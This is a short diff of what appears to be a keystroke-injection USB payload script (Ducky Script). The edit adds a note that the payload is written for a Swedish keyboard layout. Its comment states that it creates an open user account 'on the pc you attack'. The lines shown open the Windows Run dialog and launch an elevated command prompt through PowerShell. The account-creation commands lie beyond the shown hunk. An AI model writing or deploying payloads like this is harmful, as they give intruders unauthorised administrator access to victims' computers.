@@ -1,4 +1,4 @@
-REM this will create a new open USER on the pc you attack
+REM this will create a new open USER on the pc you attack LANGUAGE FOR THIS PAYLOAD IS (SWEDISH)
 GUI r
 DELAY 1000
 STRING powershell Start-Process cmd -Verb runAs
